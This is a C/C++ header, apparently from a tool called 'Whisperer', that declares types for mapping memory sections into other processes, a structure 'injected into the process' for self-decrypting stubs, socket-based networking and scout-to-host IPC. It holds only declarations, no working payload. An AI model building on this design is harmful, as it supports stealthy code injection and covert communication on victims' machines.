#ifndef __WHISPERER_SHARED_
#define __WHISPERER_SHARED_

#ifndef _WINDOWS_
#include <Windows.h>
#endif

#ifndef _WINTERNL_
#include <winternl.h>
#endif

#ifndef _VECTOR_
#include <vector>
#endif

#ifndef __MODULE_RESOLVER_
#include "ModuleResolver.h"
#endif

#define MAX_STUB_SIZE        1024

#pragma region Function Pointers

typedef enum _SECTION_INHERIT {
	ViewShare = 1,
	ViewUnmap = 2,
} SECTION_INHERIT, *PSECTION_INHERIT;

typedef NTSTATUS(NTAPI *fnNtMapViewOfSection)(
	_In_        HANDLE          SectionHandle,
	_In_        HANDLE          ProcessHandle,
	_Inout_     PVOID           *BaseAddress,
	_In_        ULONG_PTR       ZeroBits,
	_In_        SIZE_T          CommitSize,
	_Inout_opt_ PLARGE_INTEGER  SectionOffset,
	_Inout_     PSIZE_T         ViewSize,
	_In_        SECTION_INHERIT InheritDisposition,
	_In_        ULONG           AllocationType,
	_In_        ULONG           Win32Protect
	);

typedef NTSTATUS(NTAPI *fnNtCreateSection)(
	_Out_    PHANDLE            SectionHandle,
	_In_     ACCESS_MASK        DesiredAccess,
	_In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
	_In_opt_ PLARGE_INTEGER     MaximumSize,
	_In_     ULONG              SectionPageProtection,
	_In_     ULONG              AllocationAttributes,
	_In_opt_ HANDLE             FileHandle
	);

typedef HMODULE(WINAPI *fnLoadLibraryW)(LPCWSTR FileName);

typedef BOOL(WINAPI *fnFreeLibrary)(
	_In_ HMODULE hModule
	);

typedef struct URL_COMPONENTS {
	DWORD         dwStructSize;
	LPWSTR        lpszScheme;
	DWORD         dwSchemeLength;
	int           nScheme;
	LPWSTR        lpszHostName;
	DWORD         dwHostNameLength;
	WORD          nPort;
	LPWSTR        lpszUserName;
	DWORD         dwUserNameLength;
	LPWSTR        lpszPassword;
	DWORD         dwPasswordLength;
	LPWSTR        lpszUrlPath;
	DWORD         dwUrlPathLength;
	LPWSTR        lpszExtraInfo;
	DWORD         dwExtraInfoLength;
} URL_COMPONENTS, *LPURL_COMPONENTS;

typedef BOOL(WINAPI *fnWinHttpCrackUrl)(
	_In_    LPCWSTR          pwszUrl,
	_In_    DWORD            dwUrlLength,
	_In_    DWORD            dwFlags,
	_Inout_ LPURL_COMPONENTS lpUrlComponents
	);

typedef NTSTATUS(WINAPI *fnNtClose)(
	_In_ HANDLE Handle
);

typedef NTSTATUS(WINAPI *fnNtUnmapViewOfSection)(
	_In_     HANDLE ProcessHandle,
	_In_opt_ PVOID  BaseAddress
);

typedef HANDLE(WINAPI *fnOpenProcess)(
	_In_ DWORD dwDesiredAccess,
	_In_ BOOL  bInheritHandle,
	_In_ DWORD dwProcessId
);

typedef BOOL(WINAPI *fnK32EnumProcessModules)(
	_In_  HANDLE  hProcess,
	_Out_ HMODULE *lphModule,
	_In_  DWORD   cb,
	_Out_ LPDWORD lpcbNeeded
);

typedef DWORD(WINAPI *fnK32GetModuleBaseNameW)(
	_In_     HANDLE  hProcess,
	_In_opt_ HMODULE hModule,
	_Out_    LPWSTR  lpBaseName,
	_In_     DWORD   nSize
);

typedef struct _MODULEINFO {
	LPVOID lpBaseOfDll;
	DWORD  SizeOfImage;
	LPVOID EntryPoint;
} MODULEINFO, *LPMODULEINFO;

typedef BOOL(WINAPI *fnK32GetModuleInformation)(
	_In_  HANDLE       hProcess,
	_In_  HMODULE      hModule,
	_Out_ LPMODULEINFO lpmodinfo,
	_In_  DWORD        cb
);

typedef struct _WHISPERER_FUNCTIONS {
	ModuleResolver *K32;
	ModuleResolver *NtDll;
	ModuleResolver *Iphlp;
	ModuleResolver *WinInet;
	ModuleResolver *WinHttp;

	fnNtMapViewOfSection NtMapViewOfSection;
	fnNtCreateSection NtCreateSection;
	fnLoadLibraryW LoadLibraryW;
	fnFreeLibrary FreeLibrary;
	fnWinHttpCrackUrl WinHttpCrackUrl;
	fnNtClose NtClose;
	fnNtUnmapViewOfSection NtUnmapViewOfSection;
	fnOpenProcess OpenProcess;
	fnK32EnumProcessModules K32EnumProcessModules;
	fnK32GetModuleBaseNameW K32GetModuleBaseNameW;
	fnK32GetModuleInformation K32GetModuleInformation;
} WHISPERER_FUNCTIONS, *PWHISPERER_FUNCTIONS;

#pragma endregion




typedef struct _ALLOC_MAPPING {
	HANDLE Section;
	PVOID RemoteBase;
	PVOID LocalBase;
	ULONG Size;
} ALLOC_MAPPING, *PALLOC_MAPPING;


#pragma pack(push)

typedef struct _WHISPERER_FRAMEWORK {
	void *IpHelperBase; // 0
	void *WinInetBase; // 4
	void *Kernel32Base; // 8
	void *NtDllBase; // 12

	void *DecryptExecutionBlock; //16 // Called by the first few instructions of a stub to decrypt self, eax should be address of first byte to begin decrypting at, ecx should be the size of the data, and edx:ebx should be a 64 bit key for the data

	void *socket; // 20
	void *connect; // 24
	void *wsastartup; // 28
	void *virtualalloc; // 32
	void *virtualfree; // 36
	void *gethostbyname; // 40
	void *send; // 44
	void *recv; // 48
	void *closesocket; // 52
	void *wsacleanup; // 56
	unsigned char remiphlp; // 60
	unsigned char remwininet; // 61
	void *freelib; // 62
} WHISPERER_FRAMEWORK, *PWHISPERER_FRAMEWORK; // This is what gets injected into the process for stub to use

typedef struct _WHISPERER_CONTEXT {
	void *WhispererFrameworkAddress; // 0
	unsigned char *HttpRequest; // 4
	unsigned long Address4; // 8
	unsigned char Address6[16]; // 12
	unsigned char Use6; // 28 // Use ipv6?
	unsigned char Padding0; // 29
	unsigned short Port; // 30


	unsigned long SocketHandle; // 32
	void *ReceiveBuffer; // 36
	char Unused0[256]; // 40
	char Unused1[256]; // 296

	unsigned char Unused2; // 552
	unsigned char Unused3; // 553
	unsigned char ResolvedAddress4[4]; // 554
	unsigned char ResolvedAddress6[16]; // 558
	unsigned char HostToResolve[256]; // 574
	void *CallerBase; // 832
	unsigned short ResolvedAddressType; // 836
	unsigned short Unused4; // 838

	unsigned long RequestLength; // 840
	unsigned long ResponseLength; // 844
	unsigned long ErrorCode; // 848
	void *TransferBuffer; // 852
	unsigned long TransferBlockSize; // 856
} WHISPERER_CONTEXT, *PWHISPERER_CONTEXT; // Passed to stub as argument

										  /** upon scout writing to the ipc interface, it should acquire the critical section, then set the WriteLocked bit to 1 and update the tag, then wait until the tag has been changed **/
										  /** when the host has completed the write, it should set the WriteLocked bit to 0, and the ReadLocked bit to 1, do not update the tag **/
										  /** when the host has completed the read, it should set the ReadLocked bit to 0, and update the tag **/
										  /** when scout sees the tag has changed, it is then able to release the critical section and the next request may be served **/

#pragma pack(pop)






#endif
